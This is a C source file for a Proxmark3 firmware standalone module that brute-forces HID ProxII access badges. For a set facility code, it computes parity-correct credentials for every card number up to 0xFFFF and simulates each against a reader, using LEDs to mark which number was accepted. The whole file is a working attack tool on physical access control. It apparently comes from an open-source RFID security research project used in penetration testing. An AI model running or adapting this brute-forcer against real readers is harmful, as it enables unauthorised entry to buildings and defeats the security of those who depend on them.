//-----------------------------------------------------------------------------
// Copyright (C) Yann Gascuel 2023
// Copyright (C) Proxmark3 contributors. See AUTHORS.md for details.
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// See LICENSE.txt for the text of the license.
//-----------------------------------------------------------------------------
// LF HID ProxII Brutforce v2 by lnv42 - based on Proxbrute by Brad antoniewicz
//
//     Following code is a trivial brute forcer for when you know the facility
//     code and want to find valid(s) card number(s). It will try all card
//     fnumbers rom CARDNUM_START to CARDNUM_END one by one (max. ~65k tries).
//     This brute force will be a lot faster than Proxbrute that will try all
//     possibles values for LF low, even those with bad checksum (~4g tries).
//     LEDs will help you know which card number(s) worked.
//
//-----------------------------------------------------------------------------
#include "standalone.h" // standalone definitions
#include "proxmark3_arm.h"
#include "appmain.h"
#include "fpgaloader.h"
#include "util.h"
#include "dbprint.h"
#include "lfops.h"
#include "parity.h"

#define CARDNUM_START 0
#define CARDNUM_END 0xFFFF
#define FACILITY_CODE 2

void ModInfo(void) {
    DbpString("  LF HID ProxII bruteforce v2");
}

// samy's sniff and repeat routine for LF
void RunMod(void) {
    StandAloneMode();
    Dbprintf(">>  LF HID proxII bruteforce v2 a.k.a Prox2Brute Started <<");
    FpgaDownloadAndGo(FPGA_BITSTREAM_LF);

    const uint32_t high = 0x20; // LF high value is always 0x20 here
    uint32_t low = 0;

    uint32_t fac = FACILITY_CODE, cardnum = 0;

    LED_D_ON();
    while (BUTTON_HELD(200) != BUTTON_HOLD) { // Waiting for a 200ms button press
        WDT_HIT();
        // exit from SamyRun,   send a usbcommand.
        if (data_available()) { // early exit
            DbpString("[=] You can take the shell back :) ...");
            LEDsoff();
            return;
        }
    }

    LED_C_ON();
    WAIT_BUTTON_RELEASED(); // We are now ready to start brutforcing card numbers
    LEDsoff();

    Dbprintf("[=] Starting HID ProxII Bruteforce from card %08x to %08x",
             CARDNUM_START, MIN(CARDNUM_END, 0xFFFF));

    for (cardnum = CARDNUM_START ; cardnum <= MIN(CARDNUM_END, 0xFFFF) ; cardnum++) {
        WDT_HIT();

        // exit from SamyRun,   send a usbcommand.
        if (data_available()) break;

        // short button press may be used for fast-forward
        if (BUTTON_HELD(1000) == BUTTON_HOLD) break; // long button press (>=1sec) exit

        // calculate the new LF low value including Card number, Facility code and checksum
        low = (cardnum << 1) | (fac << 17);
        low |= oddparity32((low >> 1) & 0xFFF);
        low |= evenparity32((low >> 13) & 0xFFF) << 25;

        Dbprintf("[=] trying Facility = %08x, Card = %08x, raw = %08x%08x",
                 fac, cardnum, high, low);

        // Start simulating an HID TAG, with high/low values, no led control and 20000 cycles timeout
        CmdHIDsimTAGEx(0, high, low, 0, false, 20000);

        // switch leds to be able to know (aproximatly) which card number worked (64 tries loop)
        LED_A_INV(); // switch led A every try
        if ((cardnum - CARDNUM_START) % 8 == 7) // switch led B every 8 tries
            LED_B_INV();
        if ((cardnum - CARDNUM_START) % 16 == 15) // switch led C every 16 tries
            LED_C_INV();
        if ((cardnum - CARDNUM_START) % 32 == 31) // switch led D every 32 tries
            LED_D_INV();
    }

    SpinErr((LED_A | LED_B | LED_C | LED_D), 250, 5); // Xmax tree
    Dbprintf("[=] Ending HID ProxII Bruteforce from card %08x to %08x",
             CARDNUM_START, cardnum - 1);
    DbpString("[=] You can take the shell back :) ...");
    LEDsoff(); // This is the end
}
